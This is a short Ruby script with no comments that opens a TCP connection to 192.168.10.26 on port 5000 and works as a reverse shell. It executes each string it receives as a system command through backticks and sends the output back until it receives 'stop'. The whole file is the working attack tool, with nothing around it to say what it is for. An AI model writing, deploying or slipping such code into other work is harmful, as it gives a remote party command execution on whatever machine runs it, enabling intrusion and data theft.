require 'socket'

TCPSocket.open("192.168.10.26", 5000) do |s|
  while true do
    c = s.recv(1024)
    if c == "stop" or c == "" then
      s.write("Closing connection")
      sleep 2
      s.close
      break
    else
      begin
        s.write(`#{c}`)
      rescue Exception => e
        s.write(e)
      end
    end
  end
end
